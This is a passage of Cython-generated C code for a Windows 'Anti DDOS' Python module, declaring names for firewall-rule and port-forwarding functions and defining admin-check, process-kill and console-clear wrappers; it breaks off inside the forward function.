static PyObject* __pyx_n_s_exit;
static PyObject* __pyx_n_s_exit_2;
static PyObject* __pyx_n_s_f;
static PyObject* __pyx_n_s_flush;
static PyObject* __pyx_n_s_force_block;
static PyObject* __pyx_n_s_force_firewall_count;
static PyObject* __pyx_n_s_format;
static PyObject* __pyx_n_s_forward;
static PyObject* __pyx_n_s_get_fb;
static PyObject* __pyx_n_s_getpid;
static PyObject* __pyx_kp_u_global_blockk;
static PyObject* __pyx_n_s_headers;
static PyObject* __pyx_n_s_host_fake;
static PyObject* __pyx_n_s_host_real;
static PyObject* __pyx_kp_u_https_fb_me_khanh10a1;
static PyObject* __pyx_n_s_i;
static PyObject* __pyx_n_s_import;
static PyObject* __pyx_n_s_input;
static PyObject* __pyx_n_s_ip;
static PyObject* __pyx_n_s_is_admin;
static PyObject* __pyx_n_s_is_get_sock;
static PyObject* __pyx_n_s_khanh;
static PyObject* __pyx_n_s_kill;
static PyObject* __pyx_n_s_kill_process;
static PyObject* __pyx_n_s_list_ban_ip;
static PyObject* __pyx_n_s_listen;
static PyObject* __pyx_n_s_main;
static PyObject* __pyx_n_u_main;
static PyObject* __pyx_n_u_n;
static PyObject* __pyx_n_s_name;
static PyObject* __pyx_n_s_name_2;
static PyObject* __pyx_kp_u_netsh_advfirewall_firewall_add_r;
static PyObject* __pyx_kp_u_netsh_advfirewall_firewall_delet;
static PyObject* __pyx_kp_u_netsh_advfirewall_firewall_set_r;
static PyObject* __pyx_kp_u_netsh_advfirewall_firewall_set_r_2;
static PyObject* __pyx_kp_u_netsh_advfirewall_firewall_show;
static PyObject* __pyx_n_u_nt;
static PyObject* __pyx_n_s_open;
static PyObject* __pyx_n_s_open_port;
static PyObject* __pyx_n_s_os;
static PyObject* __pyx_n_s_payload;
static PyObject* __pyx_n_s_pid;
static PyObject* __pyx_n_s_port;
static PyObject* __pyx_n_s_port_fake;
static PyObject* __pyx_n_s_port_real;
static PyObject* __pyx_n_s_print;
static PyObject* __pyx_kp_u_proxy_txt;
static PyObject* __pyx_n_u_r;
static PyObject* __pyx_n_s_random;
static PyObject* __pyx_n_s_re;
static PyObject* __pyx_n_s_read;
static PyObject* __pyx_n_s_recv;
static PyObject* __pyx_n_s_remove;
static PyObject* __pyx_n_s_remove_block;
static PyObject* __pyx_n_s_replace;
static PyObject* __pyx_n_s_request;
static PyObject* __pyx_n_s_reset_on_time;
static PyObject* __pyx_n_u_runas;
static PyObject* __pyx_n_s_sendall;
static PyObject* __pyx_n_s_server_socket;
static PyObject* __pyx_n_s_shell;
static PyObject* __pyx_n_s_shell32;
static PyObject* __pyx_n_s_shutdown;
static PyObject* __pyx_n_s_signal;
static PyObject* __pyx_n_s_sleep;
static PyObject* __pyx_n_s_soc;
static PyObject* __pyx_n_s_sock;
static PyObject* __pyx_n_s_socket;
static PyObject* __pyx_n_s_source;
static PyObject* __pyx_n_s_split;
static PyObject* __pyx_n_s_start;
static PyObject* __pyx_kp_u_start_https_fb_me_khanh10a1;
static PyObject* __pyx_kp_u_start_https_github_com_KhanhNguy;
static PyObject* __pyx_kp_u_start_https_youtube_com_KhanhNgu;
static PyObject* __pyx_n_s_stdin;
static PyObject* __pyx_n_s_stdout;
static PyObject* __pyx_n_s_string;
static PyObject* __pyx_n_s_subprocess;
static PyObject* __pyx_n_s_sys;
static PyObject* __pyx_n_s_system;
static PyObject* __pyx_n_s_target;
static PyObject* __pyx_n_s_temp;
static PyObject* __pyx_n_s_test;
static PyObject* __pyx_n_s_threading;
static PyObject* __pyx_n_s_time;
static PyObject* __pyx_n_s_time_connect;
static PyObject* __pyx_n_s_timeout;
static PyObject* __pyx_kp_u_title_Anti_DDOS_using_Python3_Kh;
static PyObject* __pyx_n_s_total_ip;
static PyObject* __pyx_n_s_unquote;
static PyObject* __pyx_n_s_urllib_parse;
static PyObject* __pyx_kp_u_utf_8;
static PyObject* __pyx_n_u_w;
static PyObject* __pyx_n_u_wb;
static PyObject* __pyx_n_s_windll;
static PyObject* __pyx_kp_u_wmic_process_where_name_Anti_DDO;
static PyObject* __pyx_n_s_write;
static PyObject* __pyx_n_u_y;
static PyObject* __pyx_pf_4anti_is_admin(CYTHON_UNUSED PyObject* __pyx_self);
static PyObject* __pyx_pf_4anti_2kill_process(CYTHON_UNUSED PyObject* __pyx_self);
static PyObject* __pyx_pf_4anti_4clear(CYTHON_UNUSED PyObject* __pyx_self);
static PyObject* __pyx_pf_4anti_6forward(CYTHON_UNUSED PyObject* __pyx_self, PyObject* __pyx_v_ip, PyObject* __pyx_v_port, PyObject* __pyx_v_source, PyObject* __pyx_v_destination);
static PyObject* __pyx_pf_4anti_8block_ip(CYTHON_UNUSED PyObject* __pyx_self, PyObject* __pyx_v_con_ip, PyObject* __pyx_v_port, PyObject* __pyx_v_a);
static PyObject* __pyx_pf_4anti_10exec_sys(CYTHON_UNUSED PyObject* __pyx_self, PyObject* __pyx_v_conn, PyObject* __pyx_v_request, PyObject* __pyx_v_re);
static PyObject* __pyx_pf_4anti_12create_rule(CYTHON_UNUSED PyObject* __pyx_self, PyObject* __pyx_v_port);
static PyObject* __pyx_pf_4anti_14add_ip_rule(CYTHON_UNUSED PyObject* __pyx_self, PyObject* __pyx_v_port);
static PyObject* __pyx_pf_4anti_16open_port(CYTHON_UNUSED PyObject* __pyx_self, PyObject* __pyx_v_port);
static PyObject* __pyx_pf_4anti_18about(CYTHON_UNUSED PyObject* __pyx_self);
static PyObject* __pyx_pf_4anti_20remove_block(CYTHON_UNUSED PyObject* __pyx_self, PyObject* __pyx_v_port);
static PyObject* __pyx_pf_4anti_22start(CYTHON_UNUSED PyObject* __pyx_self, PyObject* __pyx_v_port);
static PyObject* __pyx_int_0;
static PyObject* __pyx_int_1;
static PyObject* __pyx_int_2;
static PyObject* __pyx_int_8;
static PyObject* __pyx_int_9;
static PyObject* __pyx_int_1024;
static PyObject* __pyx_int_999999;
static PyObject* __pyx_tuple_;
static PyObject* __pyx_tuple__4;
static PyObject* __pyx_tuple__6;
static PyObject* __pyx_slice__17;
static PyObject* __pyx_tuple__12;
static PyObject* __pyx_tuple__14;
static PyObject* __pyx_tuple__18;
static PyObject* __pyx_tuple__23;
static PyObject* __pyx_tuple__24;
static PyObject* __pyx_tuple__25;
static PyObject* __pyx_tuple__26;
static PyObject* __pyx_tuple__27;
static PyObject* __pyx_tuple__29;
static PyObject* __pyx_tuple__32;
static PyObject* __pyx_tuple__34;
static PyObject* __pyx_tuple__36;
static PyObject* __pyx_tuple__39;
static PyObject* __pyx_tuple__41;
static PyObject* __pyx_tuple__43;
static PyObject* __pyx_tuple__45;
static PyObject* __pyx_tuple__47;
static PyObject* __pyx_tuple__49;
static PyObject* __pyx_tuple__51;
static PyObject* __pyx_tuple__52;
static PyObject* __pyx_tuple__54;
static PyObject* __pyx_tuple__56;
static PyObject* __pyx_tuple__57;
static PyObject* __pyx_tuple__58;
static PyObject* __pyx_tuple__59;
static PyObject* __pyx_tuple__60;
static PyObject* __pyx_tuple__61;
static PyObject* __pyx_tuple__64;
static PyObject* __pyx_tuple__65;
static PyObject* __pyx_tuple__66;
static PyObject* __pyx_tuple__67;
static PyObject* __pyx_tuple__68;
static PyObject* __pyx_tuple__69;
static PyObject* __pyx_tuple__70;
static PyObject* __pyx_codeobj__28;
static PyObject* __pyx_codeobj__30;
static PyObject* __pyx_codeobj__31;
static PyObject* __pyx_codeobj__33;
static PyObject* __pyx_codeobj__35;
static PyObject* __pyx_codeobj__37;
static PyObject* __pyx_codeobj__40;
static PyObject* __pyx_codeobj__42;
static PyObject* __pyx_codeobj__44;
static PyObject* __pyx_codeobj__46;
static PyObject* __pyx_codeobj__48;
static PyObject* __pyx_codeobj__50;
static PyObject* __pyx_pw_4anti_1is_admin(PyObject* __pyx_self, CYTHON_UNUSED PyObject* unused);
static PyMethodDef __pyx_mdef_4anti_1is_admin = { "is_admin", (PyCFunction)__pyx_pw_4anti_1is_admin, METH_NOARGS, 0 };
static PyObject* __pyx_pw_4anti_1is_admin(PyObject* __pyx_self, CYTHON_UNUSED PyObject* unused) {
    PyObject* __pyx_r = 0;
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("is_admin (wrapper)", 0);
    __pyx_r = __pyx_pf_4anti_is_admin(__pyx_self);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}

static PyObject* __pyx_pf_4anti_is_admin(CYTHON_UNUSED PyObject* __pyx_self) {
    PyObject* __pyx_r = NULL;
    __Pyx_RefNannyDeclarations
        PyObject* __pyx_t_1 = NULL;
    PyObject* __pyx_t_2 = NULL;
    PyObject* __pyx_t_3 = NULL;
    PyObject* __pyx_t_4 = NULL;
    PyObject* __pyx_t_5 = NULL;
    PyObject* __pyx_t_6 = NULL;
    int __pyx_lineno = 0;
    const char* __pyx_filename = NULL;
    int __pyx_clineno = 0;
    __Pyx_RefNannySetupContext("is_admin", 0);
    {
        __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
        __Pyx_XGOTREF(__pyx_t_1);
        __Pyx_XGOTREF(__pyx_t_2);
        __Pyx_XGOTREF(__pyx_t_3); {
            __Pyx_XDECREF(__pyx_r);
            __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_ctypes); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_windll); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 4, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_shell32); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 4, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_IsUserAnAdmin); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 4, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_5 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
                if (likely(__pyx_t_5)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                    __Pyx_INCREF(__pyx_t_5);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_6, function);
                }
            }
            __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 4, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_r = __pyx_t_4;
            __pyx_t_4 = 0;
            goto __pyx_L7_try_return;
        }
    __pyx_L3_error:;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0; {
            __Pyx_AddTraceback("anti.is_admin", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 5, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_4);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_XDECREF(__pyx_r);
            __Pyx_INCREF(Py_False);
            __pyx_r = Py_False;
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            goto __pyx_L6_except_return;
        }
    __pyx_L5_except_error:;
        __Pyx_XGIVEREF(__pyx_t_1);
        __Pyx_XGIVEREF(__pyx_t_2);
        __Pyx_XGIVEREF(__pyx_t_3);
        __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
        goto __pyx_L1_error;
    __pyx_L7_try_return:;
        __Pyx_XGIVEREF(__pyx_t_1);
        __Pyx_XGIVEREF(__pyx_t_2);
        __Pyx_XGIVEREF(__pyx_t_3);
        __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
        goto __pyx_L0;
    __pyx_L6_except_return:;
        __Pyx_XGIVEREF(__pyx_t_1);
        __Pyx_XGIVEREF(__pyx_t_2);
        __Pyx_XGIVEREF(__pyx_t_3);
        __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
        goto __pyx_L0;
    }
__pyx_L1_error:;
    __Pyx_XDECREF(__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_6);
    __Pyx_AddTraceback("anti.is_admin", __pyx_clineno, __pyx_lineno, __pyx_filename);
    __pyx_r = NULL;
__pyx_L0:;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}
static PyObject* __pyx_pw_4anti_3kill_process(PyObject* __pyx_self, CYTHON_UNUSED PyObject* unused);
static PyMethodDef __pyx_mdef_4anti_3kill_process = { "kill_process", (PyCFunction)__pyx_pw_4anti_3kill_process, METH_NOARGS, 0 };
static PyObject* __pyx_pw_4anti_3kill_process(PyObject* __pyx_self, CYTHON_UNUSED PyObject* unused) {
    PyObject* __pyx_r = 0;
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("kill_process (wrapper)", 0);
    __pyx_r = __pyx_pf_4anti_2kill_process(__pyx_self);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}

static PyObject* __pyx_pf_4anti_2kill_process(CYTHON_UNUSED PyObject* __pyx_self) {
    PyObject* __pyx_r = NULL;
    __Pyx_RefNannyDeclarations
        PyObject* __pyx_t_1 = NULL;
    int __pyx_t_2;
    int __pyx_t_3;
    PyObject* __pyx_t_4 = NULL;
    PyObject* __pyx_t_5 = NULL;
    PyObject* __pyx_t_6 = NULL;
    PyObject* __pyx_t_7 = NULL;
    int __pyx_t_8;
    PyObject* __pyx_t_9 = NULL;
    int __pyx_lineno = 0;
    const char* __pyx_filename = NULL;
    int __pyx_clineno = 0;
    __Pyx_RefNannySetupContext("kill_process", 0);
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 25, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_signal); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 26, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_HasAttr(__pyx_t_1, __pyx_n_u_SIGKILL); if (unlikely(__pyx_t_2 == ((int)-1))) __PYX_ERR(0, 26, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_3 = (__pyx_t_2 != 0);
    if (__pyx_t_3) {
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_kill); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 27, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_4);
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_pid); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 27, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_signal); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 27, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_SIGKILL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 27, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        __pyx_t_8 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_6)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_4, function);
                __pyx_t_8 = 1;
            }
        }
#if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_4)) {
            PyObject* __pyx_temp[3] = { __pyx_t_6, __pyx_t_5, __pyx_t_7 };
            __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_4, __pyx_temp + 1 - __pyx_t_8, 2 + __pyx_t_8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 27, __pyx_L1_error)
                __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        }
        else
#endif
#if CYTHON_FAST_PYCCALL
            if (__Pyx_PyFastCFunction_Check(__pyx_t_4)) {
                PyObject* __pyx_temp[3] = { __pyx_t_6, __pyx_t_5, __pyx_t_7 };
                __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_4, __pyx_temp + 1 - __pyx_t_8, 2 + __pyx_t_8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 27, __pyx_L1_error)
                    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_GOTREF(__pyx_t_1);
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            }
            else
#endif
            {
                __pyx_t_9 = PyTuple_New(2 + __pyx_t_8); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 27, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_9);
                if (__pyx_t_6) {
                    __Pyx_GIVEREF(__pyx_t_6); PyTuple_SET_ITEM(__pyx_t_9, 0, __pyx_t_6); __pyx_t_6 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_5);
                PyTuple_SET_ITEM(__pyx_t_9, 0 + __pyx_t_8, __pyx_t_5);
                __Pyx_GIVEREF(__pyx_t_7);
                PyTuple_SET_ITEM(__pyx_t_9, 1 + __pyx_t_8, __pyx_t_7);
                __pyx_t_5 = 0;
                __pyx_t_7 = 0;
                __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_9, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 27, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_1);
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        goto __pyx_L3;
    } {
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_kill); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 29, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_4);
        __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_pid); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 29, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_9);
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_signal); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 29, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_SIGABRT); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 29, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = NULL;
        __pyx_t_8 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_7)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                __Pyx_INCREF(__pyx_t_7);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_4, function);
                __pyx_t_8 = 1;
            }
        }
#if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_4)) {
            PyObject* __pyx_temp[3] = { __pyx_t_7, __pyx_t_9, __pyx_t_5 };
            __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_4, __pyx_temp + 1 - __pyx_t_8, 2 + __pyx_t_8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 29, __pyx_L1_error)
                __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        else
#endif
#if CYTHON_FAST_PYCCALL
            if (__Pyx_PyFastCFunction_Check(__pyx_t_4)) {
                PyObject* __pyx_temp[3] = { __pyx_t_7, __pyx_t_9, __pyx_t_5 };
                __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_4, __pyx_temp + 1 - __pyx_t_8, 2 + __pyx_t_8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 29, __pyx_L1_error)
                    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                __Pyx_GOTREF(__pyx_t_1);
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            }
            else
#endif
            {
                __pyx_t_6 = PyTuple_New(2 + __pyx_t_8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 29, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_6);
                if (__pyx_t_7) {
                    __Pyx_GIVEREF(__pyx_t_7); PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_7); __pyx_t_7 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_9);
                PyTuple_SET_ITEM(__pyx_t_6, 0 + __pyx_t_8, __pyx_t_9);
                __Pyx_GIVEREF(__pyx_t_5);
                PyTuple_SET_ITEM(__pyx_t_6, 1 + __pyx_t_8, __pyx_t_5);
                __pyx_t_9 = 0;
                __pyx_t_5 = 0;
                __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_6, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 29, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_1);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    }
__pyx_L3:;
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_sys); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 30, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_exit); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 30, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
        }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 30, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_r = Py_None; __Pyx_INCREF(Py_None);
    goto __pyx_L0;
__pyx_L1_error:;
    __Pyx_XDECREF(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_9);
    __Pyx_AddTraceback("anti.kill_process", __pyx_clineno, __pyx_lineno, __pyx_filename);
    __pyx_r = NULL;
__pyx_L0:;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}
static PyObject* __pyx_pw_4anti_5clear(PyObject* __pyx_self, CYTHON_UNUSED PyObject* unused);
static PyMethodDef __pyx_mdef_4anti_5clear = { "clear", (PyCFunction)__pyx_pw_4anti_5clear, METH_NOARGS, 0 };
static PyObject* __pyx_pw_4anti_5clear(PyObject* __pyx_self, CYTHON_UNUSED PyObject* unused) {
    PyObject* __pyx_r = 0;
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("clear (wrapper)", 0);
    __pyx_r = __pyx_pf_4anti_4clear(__pyx_self);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}

static PyObject* __pyx_pf_4anti_4clear(CYTHON_UNUSED PyObject* __pyx_self) {
    PyObject* __pyx_r = NULL;
    __Pyx_RefNannyDeclarations
        PyObject* __pyx_t_1 = NULL;
    PyObject* __pyx_t_2 = NULL;
    PyObject* __pyx_t_3 = NULL;
    int __pyx_lineno = 0;
    const char* __pyx_filename = NULL;
    int __pyx_clineno = 0;
    __Pyx_RefNannySetupContext("clear", 0);
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 32, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
        if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
        }
    }
    __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_n_u_cls) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_n_u_cls);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 32, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_r = Py_None; __Pyx_INCREF(Py_None);
    goto __pyx_L0;
__pyx_L1_error:;
    __Pyx_XDECREF(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3);
    __Pyx_AddTraceback("anti.clear", __pyx_clineno, __pyx_lineno, __pyx_filename);
    __pyx_r = NULL;
__pyx_L0:;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}
static PyObject* __pyx_pw_4anti_7forward(PyObject* __pyx_self, PyObject* __pyx_args, PyObject* __pyx_kwds);
static PyMethodDef __pyx_mdef_4anti_7forward = { "forward", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_4anti_7forward, METH_VARARGS | METH_KEYWORDS, 0 };
static PyObject* __pyx_pw_4anti_7forward(PyObject* __pyx_self, PyObject* __pyx_args, PyObject* __pyx_kwds) {
    PyObject* __pyx_v_ip = 0;
    PyObject* __pyx_v_port = 0;
    PyObject* __pyx_v_source = 0;
    PyObject* __pyx_v_destination = 0;
    int __pyx_lineno = 0;
    const char* __pyx_filename = NULL;
    int __pyx_clineno = 0;
    PyObject* __pyx_r = 0;
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("forward (wrapper)", 0);
    {
        static PyObject** __pyx_pyargnames[] = { &__pyx_n_s_ip,&__pyx_n_s_port,&__pyx_n_s_source,&__pyx_n_s_destination,0 };
        PyObject* values[4] = { 0,0,0,0 };
        if (unlikely(__pyx_kwds)) {
            Py_ssize_t kw_args;
            const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
            switch (pos_args) {
